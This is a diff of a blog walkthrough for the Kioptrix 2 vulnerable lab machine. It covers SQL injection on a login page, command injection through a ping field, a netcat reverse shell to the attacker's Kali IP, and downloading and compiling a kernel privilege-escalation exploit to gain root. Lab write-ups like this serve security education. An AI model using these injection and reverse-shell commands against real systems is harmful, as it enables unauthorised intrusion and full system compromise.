@@ -11,13 +11,13 @@ Kioptrix 2, the successor of one of the most popular vulnerable machines availab
 
 Upon opening in the VMware, the machine looks like this 
 
-![]()
+![](/images/uploads/b-1-.png)
 
 Then I’ll discover the IP address of the target machine using the command
 
 `arp-scan –l`
 
-![]()
+![](/images/uploads/b-2-.png)
 
 Then I did port scanning of the target machine to check for open ports and services running on them
 
@@ -87,33 +87,33 @@ Nmap done: 1 IP address (1 host up) scanned in 33.17 seconds
 
 Now after this I tried using SSH for login, but couldn’t succeed. **_IPP on port 631 with CUPS 1.1_** was my next target to try on, so I spent a good amount of time trying its exploits, but nothing really seemed to work. Then I also tried **_remote login on MySQL_** but it didn’t work either. Now I came to the **_port 80, for HTTP_**. The following is the webapp hosted on the target machine.
 
-![]()
+![](/images/uploads/b-3-.png)
 
 This opened up a login, so first things first, I tried SQL Injection 
 
-![]()
+![](/images/uploads/b-4-.png)
 
 And it actually worked, this opened the following page
 
-![]()
+![](/images/uploads/b-5-.png)
 
 Now I tried pinging my own IP address, which worked and the next thing which striked in my mind was trying command execution using the same prompt box we entered the IP address in, I start with a simple **_pwd_** command
 
 `<IP address to ping>;<linux command to execute along>`
 
-![]()
+![](/images/uploads/b-6-.png)
 
 Now I start a netcat listener on my machine, using the command
 
 `nc –nlvp <any available port>`
 
-![]()
+![](/images/uploads/b-7-.png)
 
 Now to get terminal access of the target machine on mine, I use the following command taking advantage of the command execution vulnerability I previously found.
 
 `<any IP to ping>;/usr/local/bin/nc <Kali’s IP> <Port number on which listener is on> -e '/bin/bash'`
 
-![]()
+![](/images/uploads/b-8-.png)
 
 After executing this command, we’ll see a connection is established on our listener
 
@@ -121,11 +121,11 @@ Now we got the terminal access, but to get a command line interface, I used the 
 
 `python –c “import pty;pty.spawn(‘/bin/bash/)”`
 
-![]()
+![](/images/uploads/b-9-.png)
 
 Now that I have a directory access, I tried playing in the directories for a while and used normal commands to learn more about the machines and files stored on it, some of these commands are below.
 
-![]()
+![](/images/uploads/b-10-.png)
 
 Now that I had user access and I surfed around the directories a little, I found writable file permissions for the folder _**/tmp **_which could be used for using a privilege escalation exploit compiling it and running it, which is exactly what I did.
 
@@ -135,21 +135,21 @@ Now I used two commands to make me aware of the Linux Kernel version and the OS 
 
 `uname –r`			(Linux Kernel Version)
 
-![]()
+![](/images/uploads/b-11-.png)
 
-Using this exploit, I used the searchsploit tool in Kali to find a Privilege Escalation exploit.
+Using this exploit, I used the _**searchsploit **_tool in Kali to find a Privilege Escalation exploit.
 
-![]()
+![](/images/uploads/b-12-.png)
 
 Now that I found exactly one exploit, I could try using it on the machine. To download it onto the target machine, I will make use of the remote netcat terminal I created but first I’ll need to create a server from Kali hosting that exploit file I just found. For this I used the following commands
 
 `searchsploit –m <exploit file name with extension>`		(copies the file to the working dir)
 
-![]()
+![](/images/uploads/b-13-.png)
 
 `python –m SimpleHTTPServer`			(starts a server in the same directory)
 
-![]()
+![](/images/uploads/b-14-.png)
 
 Now that this is done, I headed to the /tmp folder where writing and creating files is allowed for a normal user too, and download the exploit from the server I just created using the commands
 
@@ -157,7 +157,7 @@ Now that this is done, I headed to the /tmp folder where writing and creating fi
 
 `wget <Kali’s IP address>:<port number of server>/<filename to be downloaded>`
 
-![]()
+![](/images/uploads/b-15-.png)
 
 After the exploit is downloaded, I now need to compile it and execute it.
 
@@ -165,13 +165,13 @@ After the exploit is downloaded, I now need to compile it and execute it.
 
 `./<executable file name>`
 
-![]()
+![](/images/uploads/b-16-.png)
 
 And upon the sight of “#” I knew that I’ve successfully escalated the privilege to root access.
 
 To confirm it, I further used the commands “`whoami`” and “`id`”
 
-![]()
+![](/images/uploads/b-17-.png)
 
 Congratulations, we have successfully completed the walk-through, I hope you enjoyed it, regarding any doubts, I can be contacted via the contact information available on the blog.
 
